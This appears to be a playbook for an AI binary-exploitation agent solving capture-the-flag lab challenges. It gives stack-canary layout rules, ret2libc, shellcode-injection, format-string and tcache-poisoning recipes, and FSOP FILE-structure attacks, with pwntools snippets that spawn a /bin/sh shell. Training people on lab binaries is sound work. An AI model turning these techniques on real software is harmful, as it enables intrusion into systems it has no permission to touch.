## Stack layout pitfalls (amd64, canary, typical GCC)

- **`sub rsp, IMM` in `vuln` is not your padding-to-canary length.** It is the **total** stack frame allocation. Distance from **buffer low address** to the **canary slot** comes from **`%rbp`**-relative addresses (or a `gdb_breakpoint` at `vuln`): e.g. canary at **`[rbp-0x8]`**, buffer at **`[rbp-0x50]`** → fill **`0x50 - 0x8 = 0x48` (72)** bytes, then 8-byte canary, 8-byte saved RBP, then ROP (**88** to RIP).
- **`gdb_find_offset`** often ends at **`SIGABRT` / `__stack_chk_fail`** on canary builds — expected. Do **not** “solve” layout by guessing **80** or **96** from **`sub rsp`** alone without **rbp-relative** math.
- **Prompt sync:** If the program prints **`name?` followed by a newline**, use **`recvuntil(b'name?\\n')`**. **`recvuntil(b'name?')` alone** may never match (newline already in the buffer) → **EOFError**.
- **Canary value:** In **one running process**, the leak `printf("canary…")` shows the same **`fs:0x28`** value **`vuln` uses**. Do **not** declare “different canaries” by comparing registers from **unrelated** GDB sessions (different runs / prompts / stale state).
- For **PIE + canary ret2libc**, prefer **`ret2libc_stage1_payload` / `ret2libc_stage2_payload`** with correct **`offset`**, **`canary`**, **`canary_offset`**, and **`pie_base`** over hand-rolled padding guesses.

## Technique Playbooks

### ret2win (easiest)

A "win" function exists that is never called. Overflow the buffer to overwrite the return address with the win function's address.

1. `checksec` (or bootstrap `checksec`) → confirm no canary, no PIE
2. `elf_symbols` (or bootstrap `main`/`vuln` context) → find the win function address
3. `gdb_find_offset` → get exact offset to return address
4. Build payload: `b'A' * offset + p64(win_addr)`
5. On x86_64: if it crashes, add a `ret` gadget before win_addr for stack alignment

### ret2libc

No win function, but `system()` is in PLT or libc. Build a ROP chain to call `system("/bin/sh")`.

1. `checksec` (or bootstrap `checksec`) → confirm no canary, NX enabled (PIE optional).
2. `gdb_find_offset` → exact RIP offset.
3. If PIE is enabled:
   - Find a binary leak you can use for PIE base (often: `main is at %p` or similar).
   - Use `pie_base_from_leak` to compute `pie_base`.
   - When building ROP payloads with `ret2libc_stage1_payload` / `ret2libc_stage2_payload`, pass `pie_base` so gadget/plt/got addresses are relocated.
4. If binary has no `system@plt` or `/bin/sh` in `.rodata`, do a **2-stage leak**:
   - Stage 1: use `ret2libc_stage1_payload` to leak `puts@got` via `puts@plt`, then return to `main`.
   - Parse leaked pointer from output bytes between stable markers (often after `bye\\n` and before next prompt).
   - Do NOT assume first post-payload line is the leak; there may be blank/newline noise.
5. Resolve libc with tools:
   - `libc_symbols` to check offsets / availability.
   - `libc_base_from_leak` using leaked symbol + leaked addr.
6. Stage 2:
   - `ret2libc_stage2_payload` to call `system("/bin/sh")` with computed libc base.
   - Keep a `ret` for stack alignment on amd64 before `system`.
7. Validate shell robustly (`id` -> `uid=`), not just process non-crash.
   - Send `id` then collect with `recvrepeat(timeout)` (or multiple recv attempts), because first read can be `b'\\n'` or banner text.
   - Treat `uid=` anywhere in collected bytes as success.

### Shellcode injection (e.g. Phoenix stack-five class)

NX is disabled, so the stack is executable. The test binary is **Phoenix stack-five**-style (`gets` overflow on ~128-byte stack buffer) with a `%p` leak so it works with ASLR on.

1. `checksec` → NX false / non-executable bit off; no PIE ideal for fixed gadgets if any
2. `gdb_find_offset` → offset to saved return address (often **136** for 128-byte buffer on amd64)
3. `shellcraft_generate` → paste **`exploit_lines`** (`asm(shellcraft.sh())`, etc.); use **`exploit_lines_hex`** only if needed (~48 bytes on amd64 for `sh`)
4. **Payload layout (reliable):** `shellcode + pad to offset + p64(buf_addr)` — put shellcode at the **start** of the buffer and set RIP to **`buf_addr`** (the leaked `%p`), not `buf+k`. Use `NOP` (`\\x90`) only for padding bytes after the shellcode.
5. Parse the leak from **`process()`** output, not from `gdb_run`.
6. After spawning a shell, read with `recvuntil(b'uid=', timeout=3)` (or `recvrepeat`) — a single `recvline` often consumes a stray `\\n` before `uid=`.
7. After long tool calls, the next API turn may take several seconds; that is not a hang.

### Format string — read (leak values)

`printf(user_input)` lets you read from the stack.

1. `checksec` → note mitigations
2. **Prefer multi-run leaks (default for this agent):** use **one** **`%N$p\\n`** per **fresh process**, sweep **`N`** in a loop (e.g. 1–40), parse each line offline. Same `printf` call site → **stable** argument indices across runs. Avoid long **`%p.%p.%p...`** unless you have verified the buffer fits (**`fgets` / `read` length**); short name buffers (**≤15** chars before newline) **cannot** hold multiplex format strings. **Do not** pack comma-separated **`%a,%b,%c`**-style multiplex in one read — it still **overflows the same short buffer** and yields garbage like **`%19!`**. **`run_exploit`** often has a **~30s timeout:** a tight loop that **spawns dozens of processes** may return **timeout / exit -9** — batch indices (e.g. 1–10 per script), use **`gdb_run`** / **`gdb_breakpoint`** for a few **`N`**, or rely on **`gdb_stack`** instead of a giant automated sweep in one tool call.
3. **Do not use `elf_search` for globals:** it matches **raw bytes / strings** in the file. **`g_cs`** and other symbol names are **not** embedded as ASCII — use **`elf_symbols`** / **`gdb_examine`** on the known **`g_cs`** address from bootstrap or disassembly.
4. **What leaked pointers often look like (amd64 Linux, heuristics — confirm with `gdb_vmmap` / `gdb_stack`):**

   | Kind | Typical form | Notes |
   |------|----------------|------|
   | **PIE text / known symbol** | **`0x55xxxxxxxxxx`** or **`0x56xxxxxxxxxx`** | Often page-aligned (low 12 bits `0`); subtract **`elf_symbols`** offset → **`pie_base`**. |
   | **Heap (malloc)** | Often **`0x55…` / `0x56…`** in the same process | **Same prefix as PIE** — do not assume “`0x55` = code”; use **distance from known mapping**, **`heap`**, or a **second leak** (e.g. `main`) to separate heap vs PIE. |
   | **Libc** | **`0x7fxxxxxxxxxxxx`** (mapped segment) | Often **not** the narrow user-stack window; subtract **`__libc_start_main`**, **`puts`**, **`_IO_2_1_stdout_`**, etc. → **`libc.address`**. |
   | **Stack** | **`0x7fff…`**, **`0x7ffe…`**, **`0x7ffd…`** common | Saved RIP / frame pointers / env — useful for pivot math; **not** libc base by itself. |

   **`0x7f…`** can still be **non-libc** (vdso, other mappings, rare layouts) — if **`libc_base_from_leak`** fails, **try another** `%N$p` value.

5. **Resolving bases — try several candidates:** One leaked qword may be stack noise or a bad guess. For each plausible pointer: call **`libc_base_from_leak`** / **`pie_base_from_leak`** with **different** **`leaked_symbol`** choices (`main`, `__libc_start_main`, `puts`, …) until the result is **consistent** (base page-aligned, **`checksec`**-compatible). If no candidate works, **widen the `%N$p` sweep** or use **`gdb_stack`** at **`main`** / at **`printf`** to see real stack slots.
6. Dump / align for **writes:** **`AAAAAAAA` + `%p.%p...`** until **`0x4141414141414141`** only when the buffer allows; otherwise derive offset from multi-run **`%N$p`** + GDB.
7. **`%N$s`** — only if argument **N** holds a **valid pointer**; else SIGSEGV. Useful for strings already on stack (opened file path, env).
8. If the challenge **filters `$`**, use **`%c` chains** or raw pwntools **`fmtstr_payload(..., no_dollars=True)`**; the `format_string_payload` tool has **`no_dollars`** for that.

#### Example: pwntools multi-run `%N$p` loop (short name buffer)

`fgets` into 16 bytes ⇒ at most **15** characters before `\n` for the format — use **one** `%N$p` per connection:

```python
from pwn import context, log, process

context.binary = "./tests/challenges/fsop_starshard_x64"
binary = context.binary.path

for n in range(1, 32):
    io = process(binary)
    io.recvuntil(b"Tinselwick Tinkerer Name: ")
    io.sendline(f"%{n}$p".encode())
    io.recvuntil(b"=== Welcome ")
    leak = io.recvuntil(b"!", drop=True).strip()
    log.info("%s", f"{n}: {leak.decode(errors='replace')}")
    io.close()
# Cross-check indices against gdb_stack at printf; then libc_base_from_leak / pie_base_from_leak.
```

Batch runs in **`run_exploit`** if needed (e.g. **`N` 1–10** per script) to stay under **~30s** timeout.

#### Validating `libc_base_from_leak` output

- **Often correct:** Leaked qword matches a slot on **`gdb_stack`** at **`printf`** (e.g. return into libc like **`0x7ffff7c2a1ca`**) and **`libc_base_from_leak(..., __libc_start_main)`** returns a **page-aligned** base (`…000`). Sanity-check: **`libc_base + libc.sym["system"]`** is a valid code pointer in **`vmmap`**.
- **Misleading:** Some **`0x7f…`** values are **not** `__libc_start_main` (e.g. **vdso**, **ld**, wrong stack slot). If the tool “succeeds” but **`libc_base + system`** is nonsense, **try another `%N$p`** or a different **`leaked_symbol`** (`puts`, etc.). Leaks are often **`__libc_start_main+Δ`** (inside the function) — subtracting only **`sym["__libc_start_main"]`** assumes the leak points to the **symbol start**; for an **in-function** return address, use **`info symbol <addr>`** in GDB or match the exact offset.

### Format string — write (overwrite memory)

`printf(user_input)` lets you write to arbitrary addresses using `%n`.

1. `checksec` → note mitigations. **Target address:** use the value the binary prints (e.g. `is_admin is at 0x...`) or `elf_symbols` /.bss — **not** `elf_search` on a short name like `is_admin` (that often hits the string in `.rodata`, not the variable).
2. Find the format offset: `AAAAAAAA%p.%p...` until you see `0x4141414141414141` — that index is the `offset` for `format_string_payload` / `fmtstr_payload`.
3. Call `format_string_payload` (values 0–255 with default **write_size byte** use `%hhn`). In `run_exploit`, paste **`exploit_lines`** (readable `fmtstr_payload(...)`). Use **`exploit_lines_hex`** / `payload_hex` only if something corrupts the format specifiers.
   - In raw pwntools, `{addr: 1}` is an **8-byte** write — use `{addr: b'\\x01'}` or the MCP tool, which maps small ints to single-byte `%hhn`.
   - **Never** hand-type addresses or change `$7` to `$8` in the tool output — misaligned `%n` causes SIGSEGV.
4. **`fgets` and null bytes:** `fgets` stops at **newline**, **EOF**, or length — **not** at interior `\\x00`. **`printf(buf)`** treats `buf` as a **C string** — it stops at the **first** `\\x00`. So never place **`p64(addr)` before** your `%n` specifiers: the NUL in the address truncates parsing. Use tool/`fmtstr_payload` ordering (specifiers + padding, address bytes last).
5. **`written` / `numbwritten`:** bytes already output by **this same `printf` invocation** before your format runs. Separate `printf("Hello, "); printf(buf);` → **`written=0`** on `buf`. If one call prints a visible prefix then continues into your format as **one** `printf`, add that prefix length (see knowledge base).
6. **`no_dollars=True`** on `format_string_payload` when `$` is filtered.
7. Raw Python fallback: `fmtstr_payload(..., numbwritten=..., no_dollars=...)` — still use **`exploit_lines_hex`** / **verbatim** `payload_hex` in `run_exploit` as a fallback.

### ret2libc leak chain (two-stage)

When you need **`libc.address`** but have overflow + symbols:

1. Stage 1: ROP **`pop rdi; ret`**, **`elf.got['puts']`**, **`plt['puts']`**, **`main`** (or vuln).
2. Parse **`u64(recvline().strip().ljust(8, b'\\x00'))`** → compute **`libc.address`** from `libc.symbols['puts']` (or the symbol you leaked).
3. Stage 2: **`system` + `/bin/sh`**, **`execve`** ROP, or one_gadget (libc-specific).

### Canary

If a read/print echoes your input past the buffer until NUL: fill with non-null bytes up to the canary, leak **up to and including** the first canary byte; often reconstruct with **`u64`** (**low byte of canary is often 0x00** on amd64 — see knowledge base). When building ret2libc payloads after a canary leak, use `ret2libc_stage1_payload` / `ret2libc_stage2_payload` with `canary=<hex>`, `canary_offset=<int>`, and optional `saved_rbp`.

### Heap (tcache poisoning / UAF)

Menu-driven heap binaries need **multi-step interaction** (not single stdin payload). Prefer helper
functions that use `sendlineafter` / `recvuntil` for each prompt:

```python
def alloc(i): p.sendlineafter(b'> ', b'1'); p.sendlineafter(b'index', str(i).encode())
def free(i):  p.sendlineafter(b'> ', b'2'); p.sendlineafter(b'index', str(i).encode())
def edit(i,d):p.sendlineafter(b'> ', b'3'); p.sendlineafter(b'index', str(i).encode()); p.send(d)
def show(i):  p.sendlineafter(b'> ', b'4'); p.sendlineafter(b'index', str(i).encode()); return p.recvuntil(b'\\n1)', drop=False)
```

When binaries mix `scanf("%d", ...)` for menu choices with raw `read()` for edit/write:

- Do **not** validate full exploit flows via one giant static stdin transcript (`gdb_run` input blob).
  `read()` can greedily consume bytes that were intended as later menu choices, causing unintended early exits.
- Use interactive pwntools sequencing for exploit attempts (`sendlineafter` / `sendafter`) and resync
  to menu prompt after each action.
- For raw binary writes, prefer `sendafter(b"data: ", payload)` (not `sendline`) to avoid accidental
  newline/menu-token contamination.

Tcache notes (glibc 2.35+ safe-linking):

- Tcache bins are LIFO by size class; freed chunk user-data starts with `fd`.
- Safe-linking encoding: `encoded_fd = (chunk_addr >> 12) ^ target_addr`.
- **Do not write raw target ptr into `fd`.** If you write `0x404080` directly, glibc will
  decode it again and you will usually get `malloc(): unaligned tcache chunk detected`.
- Common failure diagnosis:
  - `unaligned tcache chunk detected` after poisoning usually means wrong safe-linking math
    (wrong `chunk_addr` / wrong encode step), not a random timeout.
  - Use the poisoned chunk's user pointer (the location of `fd`) as `chunk_addr`.
- UAF poisoning pattern:
  1. Allocate two same-size chunks `A`, `B`.
  2. Free `B`, then `A` (bin head is `A -> B`).
  3. Use UAF on `A` to overwrite its encoded `fd` with `((A_addr >> 12) ^ target)`.
  4. Allocate once (gets `A`), allocate again (returns `target` overlap).
  5. Write non-zero to the target gate (e.g. a permission/flag variable) and trigger the success path.

When available, parse target pointers from banner text (e.g. `is_admin is at %p`) instead of guessing
symbol addresses from disassembly.

### Heap — FSOP via FILE struct corruption (glibc ≥ 2.34)

**Context:** `__malloc_hook` / `__free_hook` are gone. A **write primitive into a live**
`FILE *` / `_IO_FILE_plus` (UAF on a pointer that still aliases the struct, overlap, or poisoned
chunk) plus a **trigger** (`fflush(fp)`, `fclose(fp)`, `exit`, `fflush(NULL)`) is the core pattern.

**`fclose` UAF + heap reclaim:** If the chain is **`fclose(fp)`** (stream freed) but a **global still
holds the old `FILE *`**, the next step is often **`malloc` + write fake struct** into that address.
That only works if your **`malloc(n)` lands in the same size class** as the chunk glibc used for the
`FILE` object. **Wrong `n` (e.g. 0x100 when the `FILE` chunk is ~0x1d0 usable)** → a **different** bin → **no
reclaim** → `fputs` still sees freed/corrupt data. **Measure on the target libc:** e.g. one-shot
`malloc_usable_size(fp)` right after `fopen`, or **`heap bins` / trial `malloc` sizes** in GDB until
`malloc(k)` returns the **same pointer** as the old `FILE *` after `fclose`. Starshard-style labs
that let you **choose** `malloc` size in-menu depend on this match.

**Pick the technique from RELRO (use `checksec` / `readelf -d` for `BIND_NOW`):**

| Mitigation | Practical FSOP direction |
|------------|----------------------------|
| **Partial RELRO** | **`fflush` → fake `_IO_write_*` → bytes written into writable memory** — often **`.got.plt`** if you can aim the copy at `got['puts']` (or similar) and satisfy the write path. |
| **Full RELRO (`BIND_NOW`)** | **GOT is not writable** — do **not** plan a GOT overwrite. Use a **libc vtable-relative** chain (e.g. **`_IO_wfile_jumps - 0x18`**) or **`_IO_str_overflow` via `fclose`**, with **libc base** from a leak. |

**Leaking libc from the FILE:** A **`show` / `fread` of the `FILE` blob** (e.g. slot 0 holding the raw
heap pointer to the struct) exposes the **vtable pointer at offset +0xd8** (points into libc’s jump
tables). Common recipe:

- `libc.address = u64(raw[0xd8:0xe0]) - libc.sym['_IO_file_jumps']`

Confirm with **`gdb_examine`** on the live stream and **`libc_symbols`** — symbol names and exact
vtable class can vary slightly with glibc build; adjust if the math does not land on a plausible
`libc.base`.

**Always build with pwntools `FileStructure`** (or verified offsets from `gdb_examine &_IO_2_1_stdout_`);
avoid guessing raw byte layouts. Use `fp.offset_of('_IO_write_base')` if field names differ by
pwntools version.

---

**Path A — `fflush` + GOT (partial RELRO only)**

Works when **`elf.got['puts']`** (or another called PLT target) is **writable**. Idea: make **`fflush`**
copy **controlled bytes** into that GOT slot.

```python
from pwn import FileStructure

# null= → address used for _lock (+0x88): writable NULL or unlocked lock (e.g. libc _IO_2_1_stdout_+0x88)
fp = FileStructure(null=0)
fp.flags = 0xfbad0000 | 0x800   # _IO_CURRENTLY_PUTTING — needed for the write path
fp._IO_write_base = elf.got['puts']
fp._IO_write_ptr  = elf.got['puts'] + 8
fp._IO_write_end  = elf.got['puts'] + 8
fp._IO_buf_base   = elf.got['puts']
fp._IO_buf_end    = elf.got['puts'] + 8
fp.fileno = 1
payload = bytes(fp)[:chunk_size]   # prepend p64(win_addr) at buf start if layout requires it
```

Steps: resolve **`win`** (or target) from symbols/leaks → **UAF `edit(0, payload)`** into the live
`FILE` → **trigger `fflush`** → later **`puts`** resolves through patched GOT → **`win`**.

**Requirements:** `write_base < write_ptr`; valid **`fileno`** for the path libc takes; **`_lock`** sane
(pass **`null=`** to `FileStructure` or point **`_lock`** at a **writable null** qword, e.g. a known
unlocked lock in libc such as **`_IO_2_1_stdout_` + 0x88** when appropriate).

---

**Path B — Full RELRO: `_IO_wfile_jumps - 0x18` + `fflush` (glibc 2.35+ style, libc-sensitive)**

When **GOT is locked**, redirect control through **wide / wfile** vtables that **`fflush`** can reach
(**`_IO_wfile_underflow`** and friends). A **documented working pattern** is to set the **fake vtable
slot** to **`libc.sym['_IO_wfile_jumps'] - 0x18`** so the vtable check and dispatch line up with libc’s
real tables (not arbitrary heap “fake vtables” — those fail **`_IO_vtable_check`**).

Sketch (adjust **`FileStructure` field names**, **`file_ptr`**, and sizes to your binary; **validate in GDB**):

```python
fake_vtable = libc.sym['_IO_wfile_jumps'] - 0x18
needle = b'\x48\x83\xc7\x10\xff\xe1'  # add rdi, 0x10 ; jmp rcx
gadget = libc.address + next(libc.search(needle))

fake = FileStructure(null=libc.sym['_IO_2_1_stdout_'] + 0x88)
fake.flags         = 0x3b01010101010101   # example; drives internal branch — tune with gdb
fake._IO_read_end  = libc.sym['system']   # value that ends up in rcx for jmp rcx
fake._IO_save_base = gadget
fake._IO_write_end = u64(b'/bin/sh\x00')
fake._lock         = libc.sym['_IO_2_1_stdout_'] + 0x88
fake._codecvt      = file_ptr + 0xb8
fake._wide_data    = file_ptr + 0x200
fake.unknown2      = p64(0) * 2 + p64(file_ptr + 0x20) + p64(0) * 3 + p64(fake_vtable)
payload = bytes(fake)[:0x100]
```

**Trigger:** **`fflush(file_ptr)`** → hits **wfile** path → controlled transfer (e.g. toward
**`system("/bin/sh")`**). This path is **version- and layout-sensitive**: always confirm **`FILE`**
and **`_IO_wfile_jumps`** offsets against **`gdb_examine`** on the target libc.

---

**Path C — Full RELRO alternate: `_IO_str_jumps` + `fclose`**

- Aim **`fp.vtable`** / overflow path at **`_IO_str_overflow`**-style dispatch (often via
  **`libc.sym['_IO_str_jumps']`** and **`fclose(fp)`**), with **`_IO_buf_base`** / related fields set so
  **`system`** gets a useful pointer (classic **`house_of_apple`**-family tricks).
- **Offsets are extremely libc-specific** — tune with **`gdb_examine`**, not copy-paste.

---

**`_IO_vtable_check` reminder:** Arbitrary **heap** addresses **fail** as fake vtables. Prefer **offsets
into real libc IO jump tables** (e.g. **`_IO_wfile_jumps - 0x18`**) or validated **`_IO_str_jumps`**
chains — see public writeups (e.g. byor / “nobodyisnobody” style FSOP) for your glibc.

**GDB (before trusting offsets):**

- `gdb_examine binary_path &_IO_2_1_stdout_` — canonical **`FILE`** layout for that libc
- `gdb_examine binary_path <address_of_fp>` — the **actual** stream you corrupt

**Common failure modes:**

- **`_IO_write_base >= _IO_write_ptr`** on Path A → **`fflush`** does not copy; keep **`ptr > base`**
- **`SIGSEGV` in `_IO_vtable_check`** — fake vtable not in an allowed libc region; use Path B/C patterns
- **`_lock` (+0x88)** invalid → use **`null=`** or a known **unlocked** lock location
- **`fileno == -1`** — some paths **skip** the syscall; set a **valid fd** (often **`1`**) when the chain needs it
- **Wide vs narrow `FILE`:** **`fopen`** streams may still hit **wfile** paths depending on flags and
  glibc — if Path A fails on Full RELRO, re-read **`checksec`** and switch to Path B/C
- **Reclaim size mismatch** after **`fclose` UAF** — arbitrary **`malloc(100)`** will not refill a
  **`FILE`-sized** chunk; pick **`malloc` request size** that matches the freed chunk (see **`fclose` UAF + heap reclaim`** above).

### GDB / dynamic analysis

Use **`gdb_run`**, **`gdb_breakpoint`**, **`gdb_stack`**, **`gdb_vmmap`**, **`gdb_examine`** for stack layout, mappings, and pointer checks. Prefer agent tools over ad-hoc shell when possible.

### Bootstrap usage

If bootstrap context is present, reuse it for first-pass recon (mitigations, symbols, strings, and **Ghidra pseudocode** when included). Re-run tools only when you need additional detail or to validate assumptions. Disable expensive startup Ghidra with `PWN_AGENT_BOOTSTRAP_GHIDRA=0` if the host is slow or Ghidra is unavailable.
